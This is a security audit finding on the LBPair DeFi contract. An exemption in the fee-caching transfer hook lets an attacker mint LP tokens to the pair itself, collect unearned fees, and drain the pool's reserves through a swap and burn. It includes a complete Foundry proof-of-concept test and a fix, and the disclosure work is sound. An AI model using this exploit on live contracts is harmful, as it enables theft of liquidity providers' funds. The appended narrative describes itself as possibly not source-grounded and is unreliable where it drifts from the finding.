---
id: 16992
severity: "High"
---

# Attacker can steal entire reserves by abusing fee calculation

## Description

```solidity
function _getPendingFees(
    Bin memory _bin,
    address _account,
    uint256 _id,
    uint256 _balance
) private view returns (uint256 amountX, uint256 amountY) {
    Debts memory _debts = _accruedDebts[_account][_id];

    amountX = _bin.accTokenXPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET) - _debts.debtX;
    amountY = _bin.accTokenYPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET) - _debts.debtY;
}
```
accTokenXPerShare / accTokenYPerShare is an ever increasing amount that is updated when swap fees are paid to the current active bin.

When liquidity is first minted to user, the _accruedDebts is updated to match current _balance * accToken*PerShare. Without this step, user could collect fees for the entire growth of accToken*PerShare from zero to current value. This is done in _updateUserDebts, called by _cacheFees() which is called by _beforeTokenTransfer(), the token transfer hook triggered on mint/burn/transfer.
```solidity
function _updateUserDebts(
    Bin memory _bin,
    address _account,
    uint256 _id,
    uint256 _balance
) private {
    uint256 _debtX = _bin.accTokenXPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET);
    uint256 _debtY = _bin.accTokenYPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET);

    _accruedDebts[_account][_id].debtX = _debtX;
    _accruedDebts[_account][_id].debtY = _debtY;
}
```
The critical problem lies in _beforeTokenTransfer:
```solidity
if (_from != _to) {
    if (_from != address(0) && _from != address(this)) {
        uint256 _balanceFrom = balanceOf(_from, _id);
        _cacheFees(_bin, _from, _id, _balanceFrom, _balanceFrom - _amount);
    }
    if (_to != address(0) && _to != address(this)) {
        uint256 _balanceTo = balanceOf(_to, _id);
        _cacheFees(_bin, _to, _id, _balanceTo, _balanceTo + _amount);
    }
}
```
Note that if _from or _to is the LBPair contract itself, _cacheFees won’t be called on _from or _to respectively. This was presumably done because it is not expected that the LBToken address will receive any fees. It is expected that the LBToken will only hold tokens when user sends LP tokens to burn.

This is where the bug manifests - the LBToken address (and 0 address), will collect freshly minted LP token’s fees from 0 to current accToken*PerShare value.

We can exploit this bug to collect the entire reserve assets. The attack flow is:

  * Transfer amount X to pair
  * Call `pair.mint()`, with the to address = pair address
  * call `collectFees()` with pair address as account -> pair will send to itself the fees! It is interesting that both OZ ERC20 implementation and LBToken implementation allow this, otherwise this exploit chain would not work
  * Pair will now think user sent in money, because the bookkeeping is wrong. _pairInformation.feesX.total is decremented in `collectFees()`, but the balance did not change. Therefore, this calculation will credit attacker with the fees collected into the pool:
```solidity
uint256 _amountIn = _swapForY
    ? tokenX.received(_pair.reserveX, _pair.feesX.total)
    : tokenY.received(_pair.reserveY, _pair.feesY.total);
```
  * Attacker calls `swap()` and receives reserve assets using the fees collected.
  * Attacker calls `burn()`, passing their own address in _to parameter. This will successfully burn the minted tokens from step 1 and give Attacker their deposited assets.

Note that if the contract did not have the entire collectFees code in an unchecked block, the loss would be limited to the total fees accrued:
```solidity
if (amountX != 0) {
    _pairInformation.feesX.total -= uint128(amountX);
}
if (amountY != 0) {
    _pairInformation.feesY.total -= uint128(amountY);
}
```
If attacker would try to overflow the feesX/feesY totals, the call would revert. Unfortunately, because of the unchecked block feesX/feesY would overflow and therefore there would be no problem for attacker to take the entire reserves.

## Proof of Concept

Paste this test in LBPair.Fees.t.sol:
```solidity
function testAttackerStealsReserve() public {
    uint256 amountY=  53333333333333331968;
    uint256 amountX = 100000;

    uint256 amountYInLiquidity = 100e18;
    uint256 totalFeesFromGetSwapX;
    uint256 totalFeesFromGetSwapY;

    addLiquidity(amountYInLiquidity, ID_ONE, 5, 0);
    uint256 id;
    (,,id ) = pair.getReservesAndId();
    console.log("id before" , id);

    //swap X -> Y and accrue X fees
    (uint256 amountXInForSwap, uint256 feesXFromGetSwap) = router.getSwapIn(pair, amountY, true);
    totalFeesFromGetSwapX += feesXFromGetSwap;

    token6D.mint(address(pair), amountXInForSwap);
    vm.prank(ALICE);
    pair.swap(true, DEV);
    (uint256 feesXTotal, , uint256 feesXProtocol, ) = pair.getGlobalFees();

    (,,id ) = pair.getReservesAndId();
    console.log("id after" , id);

    console.log("Bob balance:");
    console.log(token6D.balanceOf(BOB));
    console.log(token18D.balanceOf(BOB));
    console.log("-------------");

    uint256 amount0In = 100e18;

    uint256[] memory _ids = new uint256[](1); _ids[0] = uint256(ID_ONE);
    uint256[] memory _distributionX = new uint256[](1); _distributionX[0] = uint256(Constants.PRECISION);
    uint256[] memory _distributionY = new uint256[](1); _distributionY[0] = uint256(0);

    console.log("Minting for BOB:");
    console.log(amount0In);
    console.log("-------------");

    token6D.mint(address(pair), amount0In);
    //token18D.mint(address(pair), amount1In);
    pair.mint(_ids, _distributionX, _distributionY, address(pair));
    uint256[] memory amounts = new uint256[](1);
    console.log("***");
    for (uint256 i; i < 1; i++) {
        amounts[i] = pair.balanceOf(address(pair), _ids[i]);
        console.log(amounts[i]);
    }
    uint256[] memory profit_ids = new uint256[](1); profit_ids[0] = 8388608;
    (uint256 profit_X, uint256 profit_Y) = pair.pendingFees(address(pair), profit_ids);
    console.log("profit x", profit_X);
    console.log("profit y", profit_Y);
    pair.collectFees(address(pair), profit_ids);
    (uint256 swap_x, uint256 swap_y) = pair.swap(true,BOB);

    console.log("swap x", swap_x);
    console.log("swap y", swap_y);

    console.log("Bob balance after swap:");
    console.log(token6D.balanceOf(BOB));
    console.log(token18D.balanceOf(BOB));
    console.log("-------------");

    console.log("*****");
    pair.burn(_ids, amounts, BOB);

    console.log("Bob balance after burn:");
    console.log(token6D.balanceOf(BOB));
    console.log(token18D.balanceOf(BOB));
    console.log("-------------");

}
```

## Recommendation

Code should not exempt any address from _cacheFees(). Even `address(0)` is important, because attacker can collectFees for the 0 address to overflow the FeesX/FeesY variables, even though the fees are not retrievable for them.

The Warden has shown how to exploit logic paths that would skip fee accrual, to be able to gather more fees than expected.

While the finding pertains to a loss of fees, the repeated attack will allow stealing reserves as well, for this reason I agree with High Severity.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is an accounting flaw in the fee‑accrual logic of the LBPair contract that allows an attacker to claim the entire reserves of the pool. The contract tracks per‑share accumulated fees (accTokenXPerShare and accTokenYPerShare) and stores each user’s debt to prevent double‑counting. When a token transfer occurs, the internal function _cacheFees updates the user’s debt by calling _updateUserDebts, which calculates the debt as the product of the current per‑share fee accumulator and the user’s balance. However, the transfer hook _beforeTokenTransfer deliberately skips the call to _cacheFees when the sender or receiver is the LBPair contract itself (or the zero address). This exemption was intended because the contract was not expected to hold LP tokens, but during the mint and burn processes the pair contract does receive LP tokens. As a result, the pair’s own balance is never synchronized with its fee debt, causing the contract to treat the freshly minted LP tokens as having accrued all fees from zero up to the current accumulator value. The exploit proceeds by a malicious actor depositing assets, calling mint with the pair address as the recipient, then invoking collectFees on the pair address. Because the fee debt for the pair address is zero, collectFees credits the full amount of accumulated fees to the pair’s internal fee accounting while leaving the actual token balances unchanged. The unchecked subtraction of the fee totals in collectFees allows the fee counters to underflow and wrap to a very large value, effectively giving the attacker permission to withdraw the entire pool reserves via a subsequent swap. The attacker then swaps the inflated fee balance for the underlying assets and finally burns the LP tokens, receiving back their original deposit plus the stolen reserves. The impact is total loss of the pool’s assets, affecting all liquidity providers and users of the protocol. The bug manifests whenever a transfer involves the pair contract or the zero address, which occurs during normal mint/burn operations, making it exploitable without any special permissions. The issue was discovered through manual audit and a reproduced PoC that demonstrated the fee‑collection overflow and subsequent reserve drain. It is subtle because the pair’s external balances appear unchanged and the fee totals are expected to be non‑negative; the underflow is hidden by an unchecked block, so the abnormal state does not raise obvious alarms. To remediate, the fee‑accrual function must be applied to every address without exception, including the pair contract and the zero address, and the subtraction of fee totals must be performed with safe‑math checks (or the unchecked block removed) to prevent underflow. In broader terms, this is a classic accounting bypass where privileged internal addresses are excluded from balance updates, leading to an inflation of fee entitlement and a total drain of assets.
